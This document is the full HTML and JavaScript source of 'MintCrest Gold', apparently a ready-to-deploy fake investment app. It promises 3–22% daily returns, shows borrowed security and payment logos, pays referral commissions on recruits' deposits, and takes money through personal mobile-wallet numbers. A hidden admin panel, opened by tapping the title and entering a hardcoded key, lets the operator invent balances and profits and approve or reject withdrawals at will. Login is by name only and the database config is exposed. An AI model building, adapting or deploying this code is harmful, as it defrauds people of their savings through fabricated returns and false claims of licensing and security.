<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Security Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        
        /* THEME & GLASS-MORPHISM */
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .neon-blue { border: 1px solid rgba(59, 130, 246, 0.5); box-shadow: 0 0 20px rgba(59, 130, 246, 0.2); }
        .grad-main { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        .grad-vip { background: linear-gradient(135deg, #4c1d95 0%, #8b5cf6 100%); }
        
        .active-tab { color: #60a5fa; border-top: 3px solid #60a5fa; background: linear-gradient(to top, rgba(96,165,250,0.1), transparent); }
        .page { display: none; animation: slideIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        
        .status-badge { font-size: 8px; font-weight: 900; padding: 3px 8px; border-radius: 6px; text-transform: uppercase; }
        .status-pending { background: #fef3c7; color: #92400e; }
        .status-approved { background: #dcfce7; color: #166534; }
        
        .marquee { display: inline-block; animation: scroll 20s linear infinite; white-space: nowrap; }
        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="ticker-wrap" class="hidden bg-blue-900/50 py-2 border-b border-white/10 z-[500] backdrop-blur-md">
        <div class="marquee text-[9px] font-black uppercase tracking-widest text-blue-200">
            🛡️ <span id="ticker-text">MintCrest Security: Liquidity Pools Active - Withdrawals 10% Tax - Join WhatsApp For Daily Proofs</span> 🛡️
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8 text-center">
        <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-2 uppercase bg-gradient-to-r from-white via-blue-400 to-blue-600 bg-clip-text text-transparent">MINTCREST</h1>
        <p class="text-gray-500 text-[8px] uppercase tracking-[0.5em] mb-12 font-bold italic">Official Global Vault</p>
        <div class="glass p-10 rounded-[3.5rem] w-full max-w-sm neon-blue">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-6 text-white focus:border-blue-500 transition-all">
            <button onclick="login()" class="w-full grad-main py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest text-white shadow-xl active:scale-95 transition-all">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="grad-main p-10 rounded-[3.5rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="absolute -top-10 -right-10 opacity-10"><img src="https://cdn-icons-png.flaticon.com/512/2534/2534351.png" width="200"></div>
                <p class="text-[9px] text-blue-100 font-black mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter text-white" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-300 uppercase italic bg-black/20 px-4 py-1.5 rounded-full inline-block">Checking Node...</div>
                <div class="mt-8 flex justify-between items-center">
                    <span class="text-[9px] bg-white/20 text-white px-5 py-2 rounded-full font-black">PROFIT: <span id="v-profit">0</span></span>
                    <span id="rank-badge" class="text-[8px] font-black text-blue-200 uppercase italic">RANK: STANDARD</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500 active:scale-95">📥 <span class="text-[10px] font-black block mt-2 uppercase text-green-400">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500 active:scale-95">📤 <span class="text-[10px] font-black block mt-2 uppercase text-red-400">Withdraw</span></button>
            </div>

            <div class="glass p-8 rounded-[3rem] border-t border-white/10">
                <h3 class="text-blue-400 font-black text-[10px] uppercase mb-4 italic">Corporate Security</h3>
                <div class="flex justify-around items-center opacity-40 grayscale">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e9/Norton_by_Symantec_Logo.svg" width="45">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/SSL_Logo.svg" width="35">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" width="45">
                </div>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-tighter">Asset Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <div class="flex justify-between items-center mb-6">
                <h2 class="font-black italic uppercase text-blue-400 text-sm">Security Ledger</h2>
                <button onclick="clearHistory()" class="text-[8px] bg-red-500/10 px-4 py-2 rounded-full text-red-400 font-black uppercase">Clear History</button>
            </div>
            <div id="user-history" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] border-l-8 border-blue-600 shadow-xl">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-3 italic">About MintCrest</h3>
                <p class="text-[8.5px] text-gray-400 font-bold uppercase leading-relaxed">MintCrest Gold is a licensed asset management firm operating in digital liquidity pools. We ensure 100% security of capital through automated trading bots and blockchain verification.</p>
            </div>

            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-500 shadow-xl">
                <h3 class="text-blue-400 font-black text-[11px] uppercase mb-1 italic">Partnership Link</h3>
                <p class="text-[8px] text-gray-500 mb-4 font-bold uppercase italic">Earn 5% Commission on Team Deposits</p>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly value="https://mintcrest.gold/?ref=" class="flex-1 bg-white/5 p-4 rounded-xl text-[9px] font-bold border border-white/10 outline-none">
                    <button onclick="copyRef()" class="bg-blue-600 px-6 rounded-xl font-black text-[9px] uppercase">Copy</button>
                </div>
            </div>

            <div class="glass p-8 rounded-[3rem] border-t border-white/10">
                <h3 class="text-gray-300 font-black text-[10px] uppercase mb-4 text-center">Privacy & Trust Protocol</h3>
                <div class="space-y-2 text-[8px] text-gray-500 font-bold uppercase">
                    <p>• 256-Bit Encrypted Transactions</p>
                    <p>• Zero Third-Party Data Sharing</p>
                    <p>• 10% Maintenance Tax for Vault Stability</p>
                </div>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase italic">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[4rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic">Funding Protocol</h3>
                <div class="space-y-3 mb-10 text-[9px] font-black uppercase">
                    <div class="glass p-5 rounded-2xl flex justify-between border-blue-500/20"><span>SADAPAY/JAZZ</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between border-green-500/20"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                    <div class="glass p-5 rounded-2xl flex flex-col items-center border-yellow-500/20 gap-2">
                        <span>BINANCE PAY ID / USDT (TRC20)</span>
                        <span class="text-yellow-400 text-[10px]">YOUR_BINANCE_OR_USDT_HERE</span>
                    </div>
                </div>
                <input type="number" id="dep-amount" placeholder="Capital Amount" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/10">
                <input type="text" id="dep-trx" placeholder="Transaction TID / Hash" class="w-full bg-white/5 p-5 rounded-2xl mb-10 text-center font-bold uppercase border border-white/10">
                <button onclick="submitDeposit()" class="w-full grad-main py-6 rounded-3xl font-black text-[11px] uppercase text-white shadow-xl">Verify Capital</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[4rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-4 uppercase text-sm italic">Liquidation</h3>
                <p class="text-[8px] text-gray-500 mb-8 font-black uppercase italic tracking-widest">10% Liquidity Tax Applied Automatically</p>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-black border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Name & No" class="w-full bg-white/5 p-5 rounded-2xl mb-12 text-center text-[10px] font-bold border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-3xl font-black text-[11px] uppercase text-white shadow-lg">Authorize Withdrawal</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000814] z-[5000] hidden overflow-y-auto">
        <header class="p-8 border-b border-white/10 bg-[#000814]/80 backdrop-blur-2xl sticky top-0 flex justify-between items-center shadow-2xl">
            <div>
                <h2 class="text-2xl font-black text-blue-500 uppercase italic">Command Node</h2>
                <p class="text-[8px] font-bold text-gray-500 uppercase tracking-widest">Master Control Interface</p>
            </div>
            <button onclick="closeAdmin()" class="bg-red-600 text-white px-8 py-3 rounded-2xl text-[9px] font-black uppercase">Log Out</button>
        </header>
        
        <div class="p-6">
            <div class="grid grid-cols-4 gap-2 mb-8">
                <button onclick="showAdmTab('requests')" class="grad-main p-4 rounded-2xl text-[8px] font-black uppercase text-white">Pending</button>
                <button onclick="showAdmTab('users')" class="glass p-4 rounded-2xl text-[8px] font-black uppercase">Users</button>
                <button onclick="showAdmTab('broadcast')" class="grad-gold p-4 rounded-2xl text-[8px] font-black uppercase text-white">News</button>
                <button onclick="showAdmTab('tools')" class="grad-vip p-4 rounded-2xl text-[8px] font-black uppercase text-white">Tools</button>
            </div>

            <div id="adm-sec-requests" class="adm-tab space-y-4"></div>
            <div id="adm-sec-users" class="adm-tab hidden grid grid-cols-1 gap-2"></div>

            <div id="adm-sec-broadcast" class="adm-tab hidden glass p-10 rounded-[3rem]">
                <h3 class="text-amber-500 font-black text-xs uppercase mb-4 text-center italic">Global News Push</h3>
                <textarea id="bc-msg" placeholder="Write new update for ticker..." class="w-full bg-white/5 p-6 rounded-2xl text-[11px] border border-white/10 outline-none mb-6 h-28 font-bold text-white"></textarea>
                <button onclick="sendBroadcast()" class="w-full grad-gold py-4 rounded-2xl font-black text-[10px] uppercase text-white">Activate News</button>
            </div>

            <div id="adm-sec-tools" class="adm-tab hidden space-y-6">
                <div class="glass p-10 rounded-[3rem]">
                    <h3 class="text-[10px] font-black uppercase mb-6 text-center text-blue-400">Manual Capital Injection</h3>
                    <input type="text" id="adm-user" placeholder="Target Name" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center text-[10px] font-bold border border-white/10">
                    <input type="number" id="adm-val" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center text-[10px] font-bold border border-white/10 text-white">
                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="manualEdit('balance')" class="grad-main py-4 rounded-xl font-black text-[9px] uppercase text-white">Add Balance</button>
                        <button onclick="manualEdit('profit')" class="bg-emerald-600 py-4 rounded-xl font-black text-[9px] uppercase text-white">Add Profit</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase">Fleets</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3 }, { n: "Bronze-S", p: 1000, r: 3.5 }, { n: "Silver-X", p: 5000, r: 4.5 },
            { n: "Gold-X", p: 10000, r: 5.5 }, { n: "Diamond-Master", p: 50000, r: 8 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "🚀 ROCKET PRO", p: 12000, r: 18, s: true }, { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); listenForPromos();
        };

        function listenForPromos() { db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('ticker-wrap').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } }); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = "https://mintcrest.gold/?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { 
                user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); 
                let rank = "STANDARD"; if(user.activeTier >= 10000) rank = "GOLD INVESTOR"; if(user.activeTier >= 50000) rank = "DIAMOND WHALE";
                document.getElementById('rank-badge').innerText = "RANK: " + rank; checkProfitReq(user); 
            } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-16 text-[10px] font-black uppercase italic">Ledger Empty</p>' : '';
                let items = []; snap.forEach(doc => { if(!localStorage.getItem('cl_'+doc.id)) items.push({id: doc.id, ...doc.data()}); }); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-blue-500' : 'border-green-400'; 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="status-badge status-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'background: linear-gradient(135deg, rgba(139, 92, 246, 0.2), rgba(216, 180, 254, 0.1)); border: 1px solid rgba(139, 92, 246, 0.4);' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2 shadow-xl" style="${style}"><div><h4 class="font-black text-[11px] uppercase ${p.s ? 'text-purple-400' : 'text-gray-300'}">${p.n}</h4><p class="text-[9px] text-blue-400 font-black uppercase">${p.r}% Daily Yield</p></div><div class="text-right font-black text-lg">₨ ${p.p.toLocaleString()}</div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a || !t) return alert("Required!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "deposit", status: "pending", time: Date.now() });
            alert("Deposit Logged!"); changePage('activity');
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw (10% Tax)", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Authorized!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Capital Required!"); changePage('wallet'); }
            else { if(confirm("Activate "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); await db.collection("requests").add({ user: user.name, amount: p, type: "Fleet Activation", status: "approved", time: Date.now() }); alert("Activated!"); changePage('activity'); } }
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `SYNCING: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM SECURE"; } }
        function clearHistory() { if(confirm("Clear local ledger?")) { db.collection("requests").where("user", "==", user.name).get().then(snap => { snap.forEach(doc => { localStorage.setItem('cl_'+doc.id, 'true'); }); location.reload(); }); } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied, Sweetie!"); }
        
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("System Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        async function sendBroadcast() { const m = document.getElementById('bc-msg').value.trim(); await db.collection("app_data").doc("announcement").set({ message: m }); alert("Live!"); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-6 rounded-3xl mb-4 border border-white/10 shadow-2xl">
                        <div class="flex justify-between text-[10px] font-black uppercase mb-2"><span>${d.user}</span><span class="text-blue-400">₨ ${d.amount}</span></div>
                        <div class="text-[8px] opacity-50 mb-4">${d.type} | ${d.tid||d.acc||''}</div>
                        <div class="flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="flex-1 grad-main py-3 rounded-xl text-[9px] font-black uppercase text-white">Approve</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[9px] font-black uppercase text-white">Reject</button></div>
                    </div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[9px] font-black uppercase mb-2"><div>${u.name}<br>Bal: ${u.balance}</div><button onclick="deleteUser('${u.name}')" class="text-red-500">Del</button></div>`; }); });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act==='approved') { if(type==='deposit' || type.includes('Profit')) { await ref.update({ balance: (doc.data().balance||0) + amt }); } }
            else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act }); 
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Updated!"); }
        async function deleteUser(n) { if(confirm("Delete "+n+"?")) await db.collection("users").doc(n).delete(); }
    </script>
</body>
</html>
